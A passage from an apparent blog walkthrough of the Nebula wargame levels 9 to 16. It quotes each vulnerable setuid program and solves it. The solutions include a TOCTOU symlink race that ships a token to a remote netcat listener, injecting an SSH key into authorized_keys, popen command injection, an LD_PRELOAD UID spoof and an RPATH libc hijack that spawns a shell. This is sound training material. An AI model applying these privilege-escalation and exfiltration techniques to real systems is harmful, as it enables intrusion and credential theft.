 in /home/flag09/flag09.php(15) : regexp code on line 1
snoopy AT foo dot com &gt;
</code></pre></div></div>

<p>This payload can now be modified to run <code class="language-plaintext highlighter-rouge">getflag</code>.</p>

<p><img src="/assets/exploiteducation/nebula-009-02.png" alt="alt text" title="image9-02" /></p>

<h2 id="level10">Level10</h2>
<p><a href="https://exploit.education/nebula/level-10/">Link: https://exploit.education/nebula/level-10/</a></p>

<p>Level10 contains a setuid binary which can upload a file given, but has certain restrictions.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &lt; 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
</code></pre></div></div>
<p>An example of this can be seen below, where it is possible to send the <code class="language-plaintext highlighter-rouge">passwd</code> file of the system to a remote host on port 18211. The port 18211 is specified by the program and cannot be changed. On the remote host, netcat can be used to receive the file (<code class="language-plaintext highlighter-rouge">nv -lvl 18211</code>)
<img src="/assets/exploiteducation/nebula-level10-01.png" alt="alt text" title="image10-01" /></p>

<p>By analyzing the source code, it can be determined that the linux <code class="language-plaintext highlighter-rouge">access</code> function is used for the check. By reading its man page <a href="https://linux.die.net/man/2/access">https://linux.die.net/man/2/access</a> and looking at the warning section, it looks like the <code class="language-plaintext highlighter-rouge">access</code> function is vulnerable to race conditions. Further research also points to this <a href="http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf">http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf</a></p>

<p>Reading the above lecture notes, this program can be exploited by creating a file the user has access to, then create a symbolic link back to the forbidden token file, then the flag10 program can be run multiple times to trigger the race condition.</p>

<p>This works because there is a short time window between executing the <code class="language-plaintext highlighter-rouge">access()</code> and <code class="language-plaintext highlighter-rouge">open()</code> functions. The window between the checking and using the file results in a Time-of-Check/Time-of-Use (TOCTOU) vulnerability. This is because the system might conduct context switch after access(), and run another process which will run as the <code class="language-plaintext highlighter-rouge">flag10</code> user, so if you can read the file then, the token file will be fetched and successfully sent back.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level10@nebula:/tmp$ touch /tmp/accessiblefile
level10@nebula:/tmp$ while true; do ln -sf /home/flag10/token /tmp/token; \
&gt; ln -sf /tmp/accessiblefile /tmp/token; done
</code></pre></div></div>

<p>The above bash liner will create a symbolic link for a file between the token we want to access and a file we have access to, this <code class="language-plaintext highlighter-rouge">/tmp/token</code> can now be given to the <code class="language-plaintext highlighter-rouge">flag10</code> program. The same approach can be done to run the flag program multiple times with the opportunity to read the token.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/token 192.168.1.8; done
You don't have access to /tmp/token
You don't have access to /tmp/token
You don't have access to /tmp/token
You don't have access to /tmp/token
Connecting to 192.168.1.8:18211 .. Unable to connect to host 192.168.1.8
You don't have access to /tmp/token

</code></pre></div></div>
<p>On the host the program is connecting to, netcat can be run with continuous mode by using the <code class="language-plaintext highlighter-rouge">-k</code> option.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snoopy@snoopy-MacBookPro:~$ sudo nc -klvp 18211
Listening on [0.0.0.0] (family 0, port 18211)
Connection from 192.168.1.10 51669 received!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
Connection from 192.168.1.10 51670 received!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
Connection from 192.168.1.10 51671 received!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
Connection from 192.168.1.10 51672 received!
</code></pre></div></div>

<p>This token can then be used to SSH as the <code class="language-plaintext highlighter-rouge">flag10</code> user and run the <code class="language-plaintext highlighter-rouge">getflag</code> command.</p>

<p><img src="/assets/exploiteducation/nebula-10-01.png" alt="alt text" title="image10-01" /></p>

<h2 id="level-11">Level 11</h2>
<p><a href="https://exploit.education/nebula/level-11/">Link: https://exploit.education/nebula/level-11/</a></p>

<p>Level 11 provides you with a program that executes a shell command in multiple ways and it is stated that there are two ways of completing this level.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;

/*
 * Return a random, non predictable file, and return the file descriptor for
 * it. 
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp; 0xff;

  for(i = 0; i &lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));
  
  if(length &lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;path);

      while(blue &gt; 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink &lt;= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

}
</code></pre></div></div>

<p>The program reads from stdin. The following code block within the <code class="language-plaintext highlighter-rouge">main</code> function checks for the value Content Length <code class="language-plaintext highlighter-rouge">#define CL "Content-Length: "</code> along with its length and see if it provided by the user, if these values are not found, then an ‚Äòinvalid header‚Äô is produced.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }
</code></pre></div></div>

<p>Looking at the code flow, the program will then check to see if the content length is less than the buffer that was initialized in the beginning of the program. Additonal checks are also conducted with the <code class="language-plaintext highlighter-rouge">fread</code> function. The <code class="language-plaintext highlighter-rouge">fread</code> function will check the length of the values inserted see if it is 1.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
</code></pre></div></div>

<p>If the length is 1, then the <code class="language-plaintext highlighter-rouge">process</code> function is executed. The <code class="language-plaintext highlighter-rouge">process</code> function just turns the user input to a random character and feeds it to the system function. This can be tested with the following user input:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level11@nebula:/home/flag11$ echo -ne "Content-Length: 1\nA" | /home/flag11/flag11
sh: @: command not found

</code></pre></div></div>
<p>Here we passed the character ‚ÄúA‚Äù, when this gets processed by the ‚Äúprocess‚Äù function, it is converted to the character ‚Äú@‚Äù and is then given to the <code class="language-plaintext highlighter-rouge">system</code> command.</p>

<p>This can be tried with other characters. With a character such as ‚Äúl‚Äù, it is converted in ‚Äúm‚Äù on most occasions.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level11@nebula:~$ echo -ne "Content-Length: 1\nl" | /home/flag11/flag11
sh: $'m\320\227': command not found
level11@nebula:~$ echo -ne "Content-Length: 1\nl" | /home/flag11/flag11
sh: m@C: command not found
level11@nebula:~$ echo -ne "Content-Length: 1\nl" | /home/flag11/flag11
sh: m: command not found
level11@nebula:~$ echo -ne "Content-Length: 1\nl" | /home/flag11/flag11
sh: $'m\320\313': command not found
level11@nebula:~$ 


</code></pre></div></div>
<p>To summarize this program so far, the content of stdin is taken and mmap is used to convert file content into a char array that is passed into the <code class="language-plaintext highlighter-rouge">process()</code> function. The <code class="language-plaintext highlighter-rouge">process</code> function then decodes the char array before passing it into the <code class="language-plaintext highlighter-rouge">system()</code> function call. I struggled with this level so I ended up looking for hints on the internet. This gave me the following hint:</p>

<p>Since the bash shell is trying to execute a program called shell, we could create a C program which takes the correct SUID information of the flag11 account and runs the bash shell with their privileges. This can then be symlinked (like level 10).</p>

<p>This technique however didn‚Äôt work due to setuid bit not being set before the call to system. I ended up searching for solutions for this level and found the following working solution: <a href="https://security.stackexchange.com/questions/137204/nebula-level11-setuid-is-not-working">Stack Overflow Nebula Level 11</a></p>

<p>Looking the ‚Äúelse‚Äù conditional logic, this part of the program can be triggered during the <code class="language-plaintext highlighter-rouge">buffer</code> length check.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;path);

      while(blue &gt; 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink &lt;= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

</code></pre></div></div>
<p>To abuse this logic, we have to define the environment variable from the shell we run the exploit later on. This can be done using the following command.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export TEMP=/tmp
</code></pre></div></div>

<p>Looking at the flag11 folder, another possible attack vector would be to inject a authorized_keys key file within the .ssh folder.This could be possible by injecting into a PID of an process. In old Linux systems, a pid of a process is pretty predictable and <code class="language-plaintext highlighter-rouge">srandom()</code> seeded with time is predictable. In this scenario, this PID would need to be predicted while running the flag11 program.</p>

<p>An ssh key can be created for the level11 user</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -e "/tmp/level11.key" | ssh-keygen -t rsa -b 2048 -C "level11@nebula"
</code></pre></div></div>

<p><img src="/assets/exploiteducation/level11-1.png" alt="alt text" title="level11-1" /></p>

<p>The public key of the level 11 user can now be taken and the following program can now be created.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path, int pid, int time)
{
  char *tmp;
  int fd =  0;

  srandom(time);

  tmp = getenv("TEMP");
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));


  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp; 0xff;
  for(i = 0; i &lt; length; i++) {
    buffer[i] ^= key;
    key -= buffer[i] ^ key;
  }
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[2048] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMPbdIp+lS2MR2oGvA36yE4wenUWZUY1OvNyy872Dx3No9LsWFWC6YOCQ4Unea4grPQCYZw/G7EbIgZSnWwW3+sBUASACxJQtQaAKKkK81C1jjarWMZFyN+1EjZqnaVPpj8qF33gOUKg3q2SUyi5p+a7CgzDS7nwYJ4RTdra38Q8K4HgJm1ZrgoKys7SiPnR6BXqq4DOzoJO8UXzwAUPRl0kV/2lRD2lo4LMieudTWKxZk/CQM5UG0TpwhnUmRIyCn3TwlcViSyp6wtzDY8sSekOh9UAdEwvMHAJX//RK3iEVrNz22v1N64RNQmoeNgyb8NYp7fyCxbwVavxHBvMaP level11@nebula";

  int pid;
  int fd;
  char *path;
  FILE* stream;

  //process(buf, sizeof(buf));

  //if(NULL == (stream = popen("/home/flag11/flag11", "w"))) {
  //    errx(1, "popen");
  //}

  //printf("Get pid for attacked: \n");
  //if(fgets(line, sizeof(line), stdin) == NULL) {
  //    errx(1, "reading from stdin");
  //}

  pid = getpid()+1;
  //printf("PID: %d\n",pid);
  getrand(&amp;path, pid, time(NULL));
  symlink("/home/flag11/.ssh/authorized_keys",path);
  getrand(&amp;path, pid, time(NULL)+1);
  symlink("/home/flag11/.ssh/authorized_keys",path);

  fprintf(stdout, "%s%d\n%s",CL,sizeof(buf),buf);

  //pclose(stream);
}
</code></pre></div></div>
<p>The above attacker code (taken from stackoverflow Nebula Level 11 Solution) can be used to guess the PID of the flag11 binary. When we pipe the stdout to the stdin of the victim the chances are high it is just plus one of our own exploit binary. Otherwise <code class="language-plaintext highlighter-rouge">popen()</code> could be used and injecting pid from <code class="language-plaintext highlighter-rouge">ps | grep flag11</code>. The time part is super easy because it is the time in seconds. To get a stable success rate we also use the filename for the next second. The above can be compiled using GCC.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -o exploit exploit_code.c
</code></pre></div></div>

<p><img src="/assets/exploiteducation/nebulalevel11-02.png" alt="alt text" title="nebulalevel11-02" /></p>

<p>Running the exploit provides the following output, but it is possible to SSH as the flag11 user since it was possible to inject into the .ssh folder.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level11@nebula:/tmp$ ./exploit | /home/flag11/flag11
blue = 2048, length = 2048, pink = 395
blue = 1653, length = 2048, pink = 0
flag11: fread fail(blue = 1653, length = 2048): Operation not permitted
</code></pre></div></div>

<p><img src="/assets/exploiteducation/level11-03.png" alt="alt text" title="level11-03" /></p>

<h3 id="level-12">Level 12</h3>

<p>Level 12 states that a backdoor exists on port 50001 and the following source code is provided.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)

      if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
          client:send("Better luck next time\n");
      else
          client:send("Congrats, your token is 413**CARRIER LOST**\n")
      end

  end

  client:close()
end
</code></pre></div></div>

<p>The following program takes user input and uses the <code class="language-plaintext highlighter-rouge">hash</code> function check whether the user input password matches the password hash  ‚Äú4754a4f4bd5787accd33de887b9250a0691dd198‚Äù. The issue here arises from the usage of the <code class="language-plaintext highlighter-rouge">popen</code> function which is vulnerable to command injection. As such, you can execute arbitrary commands by injection metacharacters such as <code class="language-plaintext highlighter-rouge">;</code> and <code class="language-plaintext highlighter-rouge">|</code>.</p>

<p><img src="/assets/exploiteducation/level12-01.png" alt="alt text" title="getflag" /></p>

<h3 id="level-13">Level 13</h3>

<p>Level 13 states that a security check is in place that prevents the program from continuing execution if the user invoking it does not match a specific user id. The following source code is provided.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;string.h&gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
      printf("The system administrators will be notified of this violation\n");
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf("your token is %s\n", token);
  
}
</code></pre></div></div>

<p>The security check if verifying whether the UID is 1000. If it isn‚Äôt, an error message is printed, otherwise the token is printed. This check can be bypassed by using <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> function to load a shared object file containing a custom <code class="language-plaintext highlighter-rouge">getuid()</code> function. Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. The <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> trick exploits functionality provided by the dynamic linker on Unix systems that allows you to tell the linker to bind symbols provided by a certain shared library before other libraries.</p>

<p>Using <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code>, it is not possible to run SUID binaries. However, it is possible to make a copy of the flag13 binary without the SUID bit set and <code class="language-plaintext highlighter-rouge">LDF_PRELOAD</code> can be used to spoof the suid bit, this can then be used to get the token which can be used to SSH as the <code class="language-plaintext highlighter-rouge">flag13</code> user.</p>

<p>The following C shared library can be created which returns the UID 1000.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int getuid() {
    return 1000;
}
</code></pre></div></div>

<p>This can then be compiled, set as a shared library and then ran with a copy of the flag13 binary.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level13@nebula:~$ gcc -shared -fPIC -o fakesuid.so fakesuid.c      
level13@nebula:~$ LD_PRELOAD=/home/level13/fakesuid.so /home/level13/flag13_backup 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:~$ 
</code></pre></div></div>

<p><img src="/assets/exploiteducation/flag13.png" alt="alt text" title="getflag13" /></p>

<h3 id="level-14">Level 14</h3>

<p>Level 14 states that a program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory.</p>

<p>Running the binary with random test input, the following can be deduced:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level14@nebula:/home/flag14$ ./flag14 
./flag14
	-e	Encrypt input
level14@nebula:/home/flag14$ ./flag14 -e
aaaaaaaaaaaaaaaaaa
abcdefghijklmnopqr
^C
level14@nebula:/home/flag14$ ./flag14 -e
bbbbbbbbbbbbbbbbbb
bcdefghijklmnopqrs
level14@nebula:/home/flag14$ ./flag14 -e
123456789
13579;=?A
</code></pre></div></div>

<p>It appears that each character is rotated by its index, starting with 0. So a becomes a, a[1] becomes b (ax1), a[2] becomes c (ax2) etc.</p>

<p>The following python code can be used to reverse this process. It enumerates through each value in the encrypted token gets the original value by subtracting the ord(index) of the value with its ASCII table value.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token = '857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.'
count = 0
result = []
for value in token:
  result.append(chr((ord(value) - count)))
  count +=1
print ("".join(result))
</code></pre></div></div>

<p>Running this program will return the following token: <code class="language-plaintext highlighter-rouge">8457c118-887c-4e40-a5a6-33a25353165</code>. This can be used to log in to the flag 14 user account.</p>

<p><img src="/assets/exploiteducation/level14.png" alt="alt text" title="level14" /></p>

<h3 id="level-15">Level 15</h3>

<p>Level 15 gives the following information:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.

You may wish to review how to ‚Äúcompile a shared library in linux‚Äù and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.

Clean up after yourself :)

To do this level, log in as the level15 account with the password level15. Files for this level can be found in /home/flag15.
</code></pre></div></div>

<p>By running strace on the binary, it can be deduced that  the binary is trying to load a shared library <code class="language-plaintext highlighter-rouge">libc.so.6</code> from within the <code class="language-plaintext highlighter-rouge">/var/tmp/flag15</code> folder.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level15@nebula:/home/flag15$ strace ./flag15 
execve("./flag15", ["./flag15"], [/* 19 vars */]) = 0
brk(0)                                  = 0x81e9000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb770c000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfbd0174) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfbd0174) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfbd0174) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfbd0174) = -1 ENOENT (No such file or directory)
</code></pre></div></div>

<p>Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. very shared library has a special name called the ‚Äúsoname‚Äù. The soname has the prefix ‚Äúlib‚Äù, the name of the library, the phrase `‚Äù.so‚Äù, followed by a period and a version number. The dynamic linker can be run either indirectly by running some dynamically linked program or shared object. The programs ld.so and ld-linux.so* find and load the shared objects (shared libraries) needed by a program, prepare the program to run, and then run it. LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded.</p>

<p>The <code class="language-plaintext highlighter-rouge">RPATH</code> of the binary can also be found by using objdump. RPATH is used by the dynamic linker at run time to search for shared libraries related to a binary. As mentioned, the loader ignores LD_PRELOAD if ruid != euid but this doesn‚Äôt apply to standard RPATH.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level15@nebula:/home/flag15$ objdump -p flag15 

flag15:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r-x
  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x000005d4 memsz 0x000005d4 flags r-x
    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12
         filesz 0x00000108 memsz 0x00000110 flags rw-
 DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2
         filesz 0x000000d0 memsz 0x000000d0 flags rw-
    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2
         filesz 0x00000034 memsz 0x00000034 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
         filesz 0x00000000 memsz 0x00000000 flags rw-
   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0
         filesz 0x000000f4 memsz 0x000000f4 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15
  INIT                 0x080482c0
  FINI                 0x080484ac
  GNU_HASH             0x080481ac
  STRTAB               0x0804821c
  SYMTAB               0x080481cc
  STRSZ                0x0000005a
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x08049ff4
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x080482a8
  REL                  0x080482a0
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x08048280
  VERNEEDNUM           0x00000001
  VERSYM               0x08048276

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0
</code></pre></div></div>

<p>The program loads the shared libraries before it executes, if we create a custom shared library with the same name of libc.so.6 
then place it under rpath is set (/var/tmp/flag16), the program running with flag16 privilege will execute my custom code.</p>

<p>A shared library can be created by creating a C file  and creating the <code class="language-plaintext highlighter-rouge">libc_start_main</code> function which can have a system call to the /bin/bash binary. <code class="language-plaintext highlighter-rouge">libc_start_main</code> is a function that belongs to libc.so.6, responsible for setting up the environment for our process and, after that, call <code class="language-plaintext highlighter-rouge">main</code> function. You will also need to provide the <code class="language-plaintext highlighter-rouge">__cxa_finalize</code> symbol or else the C code will return with an exit status. This can be verified with <code class="language-plaintext highlighter-rouge">LD_DEBUG</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;unistd.h&gt;

void __cxa_finalize(void *d) {
    return;
}

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system("/bin/sh");
    return 0;
}
</code></pre></div></div>
<p>During compilation, you will also need to provide the version reference for libc.so.6, in this case, it is <code class="language-plaintext highlighter-rouge">GLIBC_2.0</code>. This can be seen in the previous objdump output. As such, a file can be created with the following.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GLIBC_2.0{};
</code></pre></div></div>

<p>This can then be compiled using GCC.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic exploit.c -o libc.so.6
</code></pre></div></div>

<p>This can then be used to get a shell as the flag15 user.</p>

<p><img src="/assets/exploiteducation/level15.png" alt="alt text" title="level15" /></p>

<h3 id="level-16">Level 16</h3>

<p>Level 16 states that the following perl script is running on port 1616.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env perl</span>

<span class="k">use</span> <span class="nv">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>

<span class="k">print</span> <span class="p">"</span><span class="s2">Content-type: text/html</span><span class="se">\n\n</span><span class="p">";</span>

<span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
  <span class="nv">$username</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">tr/a-z/A-Z/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
  <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>        <span class="c1"># strip everything after a space</span>

  <span class="nv">@output</span> <span class="o">=</span> <span class="p">`</span><span class="sb">egrep "^</span><span class="si">$username</span><span class="sb">" /home/flag16/userdb.txt 2&gt;&amp;1</span><span class="p">`;</span>
  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
  

      <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
  <span class="p">}</span>

